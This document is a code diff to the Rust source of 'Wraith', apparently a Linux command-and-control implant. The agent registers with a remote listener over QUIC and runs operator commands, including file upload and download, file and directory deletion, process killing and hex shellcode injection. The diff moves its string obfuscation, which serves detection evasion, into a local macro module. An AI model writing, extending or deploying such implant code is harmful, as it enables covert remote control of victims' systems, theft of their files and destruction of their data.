@@ -2,6 +2,8 @@
 #[cfg(not(target_os = "linux"))]
 compile_error!("Wraith is a Linux-only agent. Build with: cargo build --target=x86_64-unknown-linux-musl");
 
+#[macro_use]
+mod obfuscate;
 mod inject;
 
 use std::collections::HashMap;
@@ -161,8 +163,8 @@ async fn send_quic_request(
     let mut req = Request::builder()
         .method(Method::POST)
         .uri(uri)
-        .header(obfstr::obfstr!("user-agent"), USER_AGENT)
-        .header(obfstr::obfstr!("content-type"), obfstr::obfstr!("application/json"));
+        .header(obfstr!("user-agent"), USER_AGENT)
+        .header(obfstr!("content-type"), obfstr!("application/json"));
 
     for (key, value) in headers {
         req = req.header(key, value);
@@ -210,7 +212,7 @@ async fn register_agent(
     let response = send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
 
     if response["status"] != 200 {
-        return Err(obfstr::obfstr!("failed").into());
+        return Err(obfstr!("failed").into());
     }
 
     Ok(())
@@ -266,7 +268,7 @@ fn get_local_ip() -> String {
             socket.local_addr()
         })
         .map(|addr| addr.ip().to_string())
-        .unwrap_or_else(|_| obfstr::obfstr!("unknown").to_string())
+        .unwrap_or_else(|_| obfstr!("unknown").to_string())
 }
 
 fn get_os_info() -> String {
@@ -325,7 +327,7 @@ fn parse_command(cmd: &str) -> Vec<String> {
 async fn execute_command(cmd_str: &str) -> String {
     let parts = parse_command(cmd_str.trim());
     if parts.is_empty() {
-        return obfstr::obfstr!("empty command").to_string();
+        return obfstr!("empty command").to_string();
     }
 
     let command = parts[0].as_str();
@@ -406,7 +408,7 @@ async fn handle_ls(args: &[&str]) -> String {
 
 async fn handle_cd(args: &[&str]) -> String {
     if args.is_empty() {
-        return obfstr::obfstr!("usage: cd <directory>").to_string();
+        return obfstr!("usage: cd <directory>").to_string();
     }
 
     match env::set_current_dir(args[0]) {
@@ -417,7 +419,7 @@ async fn handle_cd(args: &[&str]) -> String {
 
 async fn handle_get(args: &[&str]) -> String {
     if args.is_empty() {
-        return obfstr::obfstr!("usage: get <file>").to_string();
+        return obfstr!("usage: get <file>").to_string();
     }
 
     let file_path = args[0];
@@ -458,7 +460,7 @@ async fn handle_get(args: &[&str]) -> String {
 
 async fn handle_put(args: &[&str]) -> String {
     if args.len() < 2 {
-        return obfstr::obfstr!("usage: put <file> <hex_content>").to_string();
+        return obfstr!("usage: put <file> <hex_content>").to_string();
     }
 
     let file_path = args[0];
@@ -538,7 +540,7 @@ async fn handle_kill(args: &[&str]) -> String {
             tokio::time::sleep(Duration::from_secs(1)).await;
             std::process::exit(0);
         });
-        return obfstr::obfstr!("Agent terminating...").to_string();
+        return obfstr!("Agent terminating...").to_string();
     }
 
     // Kill other process by PID (with argument)
@@ -552,14 +554,14 @@ async fn handle_kill(args: &[&str]) -> String {
                 Err(e) => format!("kill error: {}", e),
             }
         }
-        Err(_) => obfstr::obfstr!("invalid pid").to_string(),
+        Err(_) => obfstr!("invalid pid").to_string(),
     }
 }
 
 
 async fn handle_rm(args: &[&str]) -> String {
     if args.is_empty() {
-        return obfstr::obfstr!("usage: rm <file>").to_string();
+        return obfstr!("usage: rm <file>").to_string();
     }
 
     match fs::remove_file(args[0]) {
@@ -570,7 +572,7 @@ async fn handle_rm(args: &[&str]) -> String {
 
 async fn handle_rmdir(args: &[&str]) -> String {
     if args.is_empty() {
-        return obfstr::obfstr!("usage: rmdir <directory>").to_string();
+        return obfstr!("usage: rmdir <directory>").to_string();
     }
 
     match fs::remove_dir_all(args[0]) {
@@ -581,7 +583,7 @@ async fn handle_rmdir(args: &[&str]) -> String {
 
 async fn handle_inject_sc(args: &[&str]) -> String {
     if args.is_empty() {
-        return obfstr::obfstr!("usage: injectsc <hex_shellcode>").to_string();
+        return obfstr!("usage: injectsc <hex_shellcode>").to_string();
     }
 
     match hex::decode(args[0]) {
@@ -716,7 +718,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 &state_guard,
                 cmd.id,
                 output,
-                obfstr::obfstr!("completed").to_string(),
+                obfstr!("completed").to_string(),
             )
             .await;
         }
